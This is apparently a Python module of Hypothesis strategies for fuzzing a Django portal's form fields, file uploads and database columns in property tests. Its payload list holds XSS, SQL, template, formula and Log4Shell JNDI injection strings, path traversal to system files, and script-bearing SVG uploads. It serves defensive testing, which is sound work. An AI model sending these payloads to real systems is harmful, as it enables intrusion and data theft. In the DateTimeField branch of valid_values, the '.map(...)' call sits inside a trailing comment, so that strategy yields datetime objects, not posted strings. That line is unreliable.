"""Hypothesis strategies for what a user can send, and helpers for property tests that touch the database.

Text from a request is already decoded (Django replaces bad UTF-8), so request strategies never hold lone
surrogates; `any_str` adds them for functions that take a str from anywhere. Every strategy mixes the hostile
cases into ordinary values, so a property sees both the inputs that pass validation and the ones that shouldn't.
"""

from collections.abc import Callable, Iterator
from contextlib import contextmanager
from dataclasses import dataclass
from datetime import date, datetime
from decimal import Decimal
from typing import Any

from django import forms
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import connection, models, transaction
from django.http import QueryDict
from hypothesis import strategies as st

# ---------------------------------------------------------------------------------------------------------------
# Text
# ---------------------------------------------------------------------------------------------------------------

# Bidi overrides and isolates, zero-width characters, the BOM and other format characters a name can hide behind
INVISIBLE = "​‌‍⁠﻿‪‫‬‭‮⁦⁧⁨⁩‎‏­"
WHITESPACE = " \t\r\n\x0b\x0c\x1c\x1d\x1e\x1f\x85\xa0    　"
# Characters that grow when case-folded or normalized (a name at its length limit becomes longer than it)
EXPANDING = ("ß", "ﬃ", "ŉ", "İ", "ǰ", "ﬆ", "ΐ", "ẞ", "ﷺ")

PAYLOADS = (
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "</textarea><svg onload=alert(1)>",
    "{{ request }}",
    "{% debug %}",
    "${7*7}",
    "'; DROP TABLE team; --",
    "' OR '1'='1",
    '" OR ""="',
    "1; SELECT pg_sleep(10)",
    "%' AND 1=1 --",
    "=cmd|' /C calc'!A0",
    '=HYPERLINK("http://x","y")',
    "+1+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
    "../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "%00",
    "\\x00",
    "%s%s%s%n",
    "{0.__class__}",
    "${jndi:ldap://x/a}",
    "@everyone",
    "<@&123456789012345678>",
    "```",
    "‮gnp.exe",
    "NaN",
    "null",
    "None",
    "undefined",
    "true",
    "[]",
    "{}",
    "0",
    "-1",
)


def _join(parts: list[str]) -> str:
    return "".join(parts)


def _chars(chars: st.SearchStrategy[str], min_size: int = 0, max_size: int | None = None) -> st.SearchStrategy[str]:
    """Text from these characters. Built as a list, not text(alphabet=...): Hypothesis 6.168 can fail inside its
    shrinker (ValueError from intervalsets) when one_of mixes text strategies with different alphabets."""
    return st.lists(chars, min_size=min_size, max_size=max_size).map(_join)


def request_text(max_length: int | None = None) -> st.SearchStrategy[str]:
    """Any text a form field can receive: unicode, control and invisible characters, NUL, whitespace only, markup,
    SQL and formula payloads, and lengths around max_length (or long text when there is none)."""
    limit = max_length if max_length is not None else 300
    pieces = st.one_of(
        st.text(max_size=40),
        _chars(st.characters(categories=["Cc", "Cf", "Zs", "Zl", "Zp"]), max_size=10),
        _chars(st.sampled_from(INVISIBLE + WHITESPACE), max_size=10),
        st.sampled_from(PAYLOADS),
        st.just("\x00"),
    )
    return st.one_of(
        st.just(""),
        _chars(st.sampled_from(WHITESPACE), min_size=1, max_size=20),
        st.text(),
        st.sampled_from(PAYLOADS),
        st.lists(pieces, min_size=1, max_size=5).map(_join),
        # At the limit and just past it, by characters and by characters that grow when normalized
        st.integers(max(limit - 2, 0), limit + 2).flatmap(lambda n: st.text(min_size=n, max_size=n)),
        st.integers(max(limit - 2, 0), limit + 2).map(lambda n: "x" * n),
        st.tuples(st.sampled_from(EXPANDING), st.integers(max(limit - 2, 1), limit)).map(lambda t: t[0] * t[1]),
        st.just("y" * max(limit * 4, 5000)),
    )


def any_str(max_length: int | None = None) -> st.SearchStrategy[str]:
    """request_text plus lone surrogates, for functions that take a str from any source (JSON allows them)."""
    return st.one_of(
        request_text(max_length),
        _chars(st.characters(categories=["Cs"]), min_size=1, max_size=5),
        st.tuples(st.text(max_size=10), st.characters(categories=["Cs"])).map(lambda t: t[0] + t[1]),
    )


# ---------------------------------------------------------------------------------------------------------------
# Numbers, emails, dates
# ---------------------------------------------------------------------------------------------------------------

INT_BOUNDS = (0, 1, -1, 2**15, 2**31 - 1, 2**31, -(2**31), -(2**31) - 1, 2**63 - 1, 2**63, -(2**63) - 1, 10**20)
NUMBER_SPELLINGS = (
    " 7 ",
    "+5",
    "-0",
    "007",
    "1e3",
    "1E400",
    "0x10",
    "1_000",
    "1,000",
    "1.5",
    "١٢",
    "１２",
    "Ⅻ",
    "inf",
    "-Infinity",
    "NaN",
    "sNaN",
    "9" * 5000,
    "0." + "0" * 30 + "1",
    "1" * 30 + ".99",
)


def int_text(min_value: int | None = None, max_value: int | None = None) -> st.SearchStrategy[str]:
    """Integers as a form posts them: in range, at and past every column bound, and other spellings."""
    return st.one_of(
        st.integers(min_value=min_value, max_value=max_value).map(str),
        st.integers().map(str),
        st.sampled_from(INT_BOUNDS).map(str),
        st.sampled_from(NUMBER_SPELLINGS),
        request_text(30),
    )


def decimal_text(max_digits: int | None = None, decimal_places: int | None = None) -> st.SearchStrategy[str]:
    places = decimal_places if decimal_places is not None else 2
    return st.one_of(
        st.decimals(allow_nan=False, allow_infinity=False, places=places).map(str),
        st.decimals().map(str),
        st.floats().map(str),
        st.sampled_from(("1e999", "-1e-999", "NaN", "Infinity", "-0.00", "0.001", "99999999.99", "100000000.00")),
        st.sampled_from(NUMBER_SPELLINGS),
        int_text(),
    )


def _long_email(n: int) -> str:
    """A valid address n characters long: a 64-character local part and 63-character domain labels."""
    local = "u" * 64
    labels: list[str] = []
    while len(local) + 1 + len(".".join([*labels, "com"])) < n:
        room = n - (len(local) + 1 + len(".".join([*labels, "com"]))) - 1
        labels.append("d" * max(1, min(63, room)))
    return f"{local}@{'.'.join([*labels, 'com'])}"


def email_text() -> st.SearchStrategy[str]:
    """Valid emails (including ones longer than a 254-character column), near-misses and hostile text."""
    return st.one_of(
        st.emails(),
        st.integers(240, 330).map(_long_email),
        st.emails().map(lambda e: f" {e.upper()} "),
        st.sampled_from(
            (
                "a@b",
                "a@b.c",
                "@example.com",
                "a@@example.com",
                "a@example.com\n",
                "a@exa\x00mple.com",
                "a@xn--80ak6aa92e.com",
                "a@пример.рф",
                "ü@example.com",
                '"a b"@example.com',
                "a@[127.0.0.1]",
                "<a@example.com>",
                "a@example.com, b@example.com",
            )
        ),
        request_text(320),
    )


def date_text() -> st.SearchStrategy[str]:
    return st.one_of(
        st.dates().map(date.isoformat),
        st.dates().map(lambda d: d.strftime("%m/%d/%Y")),
        st.sampled_from(("0001-01-01", "9999-12-31", "0000-00-00", "2026-02-30", "10000-01-01", "2026-13-01")),
        request_text(20),
    )


def datetime_text() -> st.SearchStrategy[str]:
    """Datetimes as datetime-local inputs and other formats post them, at the ends of the calendar too."""
    return st.one_of(
        st.datetimes().map(lambda d: d.strftime("%Y-%m-%dT%H:%M")),
        st.datetimes().map(lambda d: d.strftime("%Y-%m-%d %H:%M:%S")),
        st.datetimes().map(datetime.isoformat),
        st.sampled_from(
            (
                "0001-01-01T00:00",
                "9999-12-31T23:59",
                "9999-12-31 23:59:59",
                "0001-01-01 00:00:00",
                "2026-03-08T02:30",  # a time the spring-forward gap skips
                "2026-11-01T01:30",  # a time the fall-back fold repeats
                "2026-10-03T25:00",
                "2026-10-03T12:00+14:00",
            )
        ),
        date_text(),
    )


def time_text() -> st.SearchStrategy[str]:
    return st.one_of(
        st.times().map(lambda t: t.strftime("%H:%M")),
        st.sampled_from(("24:00", "23:59:60", "-1:00", "12:00 PM")),
        request_text(10),
    )


def ip_text() -> st.SearchStrategy[str]:
    return st.one_of(
        st.ip_addresses().map(str),
        st.sampled_from(("::ffff:10.0.0.1", "10.0.0.256", "10.0.0", "fe80::1%eth0", "0", "01.02.03.04", "::")),
        request_text(45),
    )


# ---------------------------------------------------------------------------------------------------------------
# Files
# ---------------------------------------------------------------------------------------------------------------


def file_bytes() -> st.SearchStrategy[bytes]:
    """Any bytes: random, text in other encodings, BOMs, and the signatures of the file types the portal sniffs."""
    return st.one_of(
        st.binary(max_size=2000),
        st.text(max_size=500).map(lambda s: s.encode("utf-8")),
        st.text(max_size=200).map(lambda s: s.encode("utf-16")),
        _chars(st.characters(max_codepoint=255), max_size=200).map(lambda s: s.encode("latin-1")),
        st.binary(max_size=200).map(lambda b: b"\xef\xbb\xbf" + b),
        st.sampled_from((b"\x89PNG\r\n\x1a\n", b"\xff\xd8\xff", b"GIF89a", b"%PDF-1.7", b"RIFF\0\0\0\0WEBP")).flatmap(
            lambda sig: st.binary(max_size=100).map(lambda b: sig + b)
        ),
        st.sampled_from((b"<svg onload=alert(1)>", b"<html><script>alert(1)</script>", b"\x00" * 64)),
    )


def file_names() -> st.SearchStrategy[str]:
    return st.one_of(
        st.sampled_from(("a.csv", "a.CSV", "a.csv.exe", ".csv", "a.png", "a", "evil.svg", "a.html")),
        st.tuples(request_text(300), st.sampled_from(("", ".csv", ".png", ".pdf"))).map(lambda t: t[0] + t[1]),
    )


def content_types() -> st.SearchStrategy[str]:
    return st.one_of(
        st.sampled_from(("text/csv", "image/png", "application/pdf", "text/html", "image/svg+xml", "")),
        request_text(100),
    )


def uploaded_files(contents: st.SearchStrategy[bytes] | None = None) -> st.SearchStrategy[SimpleUploadedFile]:
    """An upload as a client can send it: any bytes, any name and any claimed content type."""
    return st.builds(
        lambda content, name, ctype: SimpleUploadedFile(name or "unnamed", content, content_type=ctype),
        contents if contents is not None else file_bytes(),
        file_names(),
        content_types(),
    )


# ---------------------------------------------------------------------------------------------------------------
# Form data derived from a form's fields
# ---------------------------------------------------------------------------------------------------------------

MISSING = object()


def _choice_values(field: forms.ChoiceField) -> list[str]:
    values: list[str] = []
    for value, label in field.choices:
        if isinstance(label, (list, tuple)):  # an optgroup
            values += [str(v) for v, _ in label]
        else:
            values.append(str(value))
    return values


def field_values(field: forms.Field) -> st.SearchStrategy[Any]:
    """What a client can post for this field: values the field accepts and hostile ones. Lists are multi-values."""
    hostile = request_text(getattr(field, "max_length", None))
    match field:
        case forms.FileField():
            return uploaded_files()
        case forms.BooleanField() | forms.NullBooleanField():
            return st.one_of(st.sampled_from(("on", "true", "false", "True", "0", "1", "", "unknown")), hostile)
        case forms.ModelMultipleChoiceField():
            pks = [str(pk) for pk in field.queryset.values_list("pk", flat=True)]
            valid = st.lists(st.sampled_from(pks), unique=True) if pks else st.just([])
            return st.one_of(valid, st.lists(st.one_of(int_text(), hostile), max_size=3))
        case forms.ModelChoiceField():
            pks = [str(pk) for pk in field.queryset.values_list("pk", flat=True)]
            valid = st.sampled_from(pks) if pks else st.just("")
            return st.one_of(valid, int_text(), hostile)
        case forms.MultipleChoiceField():
            values = _choice_values(field)
            valid = st.lists(st.sampled_from(values), unique=True) if values else st.just([])
            return st.one_of(valid, st.lists(hostile, max_size=3))
        case forms.ChoiceField():
            values = _choice_values(field)
            return st.one_of(st.sampled_from(values), hostile) if values else hostile
        case forms.EmailField():
            return email_text()
        case forms.DecimalField():
            return decimal_text(field.max_digits, field.decimal_places)
        case forms.IntegerField():
            return int_text(field.min_value, field.max_value)
        case forms.DateTimeField():
            return datetime_text()
        case forms.DateField():
            return date_text()
        case forms.TimeField():
            return time_text()
        case forms.GenericIPAddressField():
            return ip_text()
        case _:
            return hostile


def valid_values(field: forms.Field) -> st.SearchStrategy[Any]:
    """Values this field type accepts, before the form's own clean methods: what toward_valid leans on."""
    max_length = getattr(field, "max_length", None)
    match field:
        case forms.EmailField():
            return st.one_of(st.emails(), st.integers(240, field.max_length or 320).map(_long_email))
        case forms.BooleanField():
            return st.sampled_from(("on", ""))
        case forms.ModelMultipleChoiceField():
            pks = [str(pk) for pk in field.queryset.values_list("pk", flat=True)]
            return st.lists(st.sampled_from(pks), min_size=1, unique=True) if pks else st.just([])
        case forms.MultipleChoiceField():
            choices = _choice_values(field)
            return st.lists(st.sampled_from(choices), unique=True) if choices else st.just([])
        case forms.ModelChoiceField():
            pks = [str(pk) for pk in field.queryset.values_list("pk", flat=True)]
            return st.sampled_from(pks) if pks else st.just("")
        case forms.ChoiceField():
            values = [v for v in _choice_values(field) if v]
            return st.sampled_from(values) if values else st.just("")
        case forms.FileField():
            return field_values(field)
        case forms.TimeField():
            return st.times().map(lambda t: t.strftime("%H:%M"))
        case forms.DecimalField():
            places = field.decimal_places or 0
            limit = Decimal(10) ** ((field.max_digits or 12) - places) - 1
            low = field.min_value if field.min_value is not None else -limit
            high = field.max_value if field.max_value is not None else limit
            return st.decimals(min_value=low, max_value=high, places=places).map(str)
        case forms.IntegerField():
            return st.integers(field.min_value, field.max_value).map(str)
        case forms.DateTimeField():
            return st.datetimes(min_value=datetime(1900, 1, 1))  # noqa: DTZ001 - a datetime-local input is naive.map(lambda d: d.strftime("%Y-%m-%dT%H:%M"))
        case forms.DateField():
            return st.dates().map(date.isoformat)
        case forms.GenericIPAddressField():
            return st.ip_addresses().map(str)
        case _:
            return st.text(min_size=1, max_size=max_length or 300).filter(lambda s: "\x00" not in s and s.strip())


def form_data(
    form: forms.BaseForm, hints: dict[str, st.SearchStrategy[Any]] | None = None, *, toward_valid: bool = False
) -> st.SearchStrategy[tuple[QueryDict, dict[str, SimpleUploadedFile]]]:
    """POST data and files for a form: each field missing, posted once, or posted twice, from field_values (or its
    hint, a strategy for values that reach the form's valid branch), plus fields the form doesn't have.

    toward_valid leans to data the form accepts: required fields are posted once, hints are drawn more often."""
    hints = hints or {}
    per_field = {}
    all_valid = {}
    for name, form_field in form.fields.items():
        values = field_values(form_field)
        valid = hints.get(name, valid_values(form_field))
        if toward_valid:
            mixed = st.one_of(valid, valid, valid, values)
            per_field[name] = mixed if form_field.required else st.one_of(st.just(MISSING), mixed, mixed)
            all_valid[name] = valid if form_field.required else st.one_of(st.just(MISSING), valid, valid)
        else:
            values = st.one_of(hints[name], values) if name in hints else values
            per_field[name] = st.one_of(st.just(MISSING), values, values, st.lists(values, min_size=2, max_size=2))
    extra = st.dictionaries(st.text(max_size=20).filter(lambda k: k not in form.fields), request_text(), max_size=3)

    def build(drawn: dict[str, Any], extras: dict[str, str]) -> tuple[QueryDict, dict[str, SimpleUploadedFile]]:
        data = QueryDict(mutable=True)
        files: dict[str, SimpleUploadedFile] = {}
        for key, value in extras.items():
            data[key] = value
        for name, value in drawn.items():
            if value is MISSING:
                continue
            if isinstance(value, SimpleUploadedFile):
                files[name] = value
            elif isinstance(value, list):
                if value and all(isinstance(v, SimpleUploadedFile) for v in value):
                    files[name] = value[0]
                else:
                    data.setlist(name, [v for v in value if isinstance(v, str)])
            else:
                data[name] = value
        return data, files

    if toward_valid:
        # Half the examples post only accepted values, so forms with many fields still reach their valid branch
        fields = st.one_of(st.fixed_dictionaries(all_valid), st.fixed_dictionaries(per_field))
        return st.builds(build, fields, st.just({}))
    return st.builds(build, st.fixed_dictionaries(per_field), extra)


def resubmission(cleaned: dict[str, Any]) -> QueryDict:
    """POST data that posts a form's cleaned values back, as a browser would send them."""
    data = QueryDict(mutable=True)
    for name, value in cleaned.items():
        match value:
            case None:
                continue
            case bool():
                if value:
                    data[name] = "on"
            case models.Model():
                data[name] = str(value.pk)
            case list() | tuple() | models.QuerySet():
                data.setlist(name, [str(v.pk) if isinstance(v, models.Model) else str(v) for v in value])
            case datetime():
                data[name] = value.isoformat()
            case date():
                data[name] = value.isoformat()
            case Decimal() | int() | str():
                data[name] = str(value)
            case _:
                data[name] = str(value)
    return data


# ---------------------------------------------------------------------------------------------------------------
# The database
# ---------------------------------------------------------------------------------------------------------------


@contextmanager
def rolled_back() -> Iterator[None]:
    """Run one example in a savepoint that is always rolled back, so examples can't see each other's rows.

    Works inside pytest-django's per-test transaction, under xdist too.
    """
    with transaction.atomic():
        yield
        transaction.set_rollback(True)


def assert_storable(field: models.Field[Any, Any], value: object) -> None:
    """The column for this model field takes the value: its type, length, range and NOT NULL, as the database
    checks them on an INSERT (lengths and ranges a plain form field doesn't know about). Fails on a database error."""
    db_type = field.db_type(connection)
    assert db_type is not None, f"{field} has no column"
    not_null = "" if field.null else " NOT NULL"
    prepared = field.get_db_prep_save(value, connection)
    with rolled_back(), connection.cursor() as cursor:
        cursor.execute(f"CREATE TEMP TABLE property_probe (v {db_type}{not_null}) ON COMMIT DROP")
        cursor.execute("INSERT INTO property_probe (v) VALUES (%s)", [prepared])


def column(model: type[models.Model], name: str) -> models.Field[Any, Any]:
    field = model._meta.get_field(name)
    assert isinstance(field, models.Field)
    return field


@dataclass(frozen=True)
class Stored:
    """A value a view writes to a model field from a form's cleaned data."""

    field: models.Field[Any, Any]
    value: object


WritesFn = Callable[[dict[str, Any]], list[Stored]]
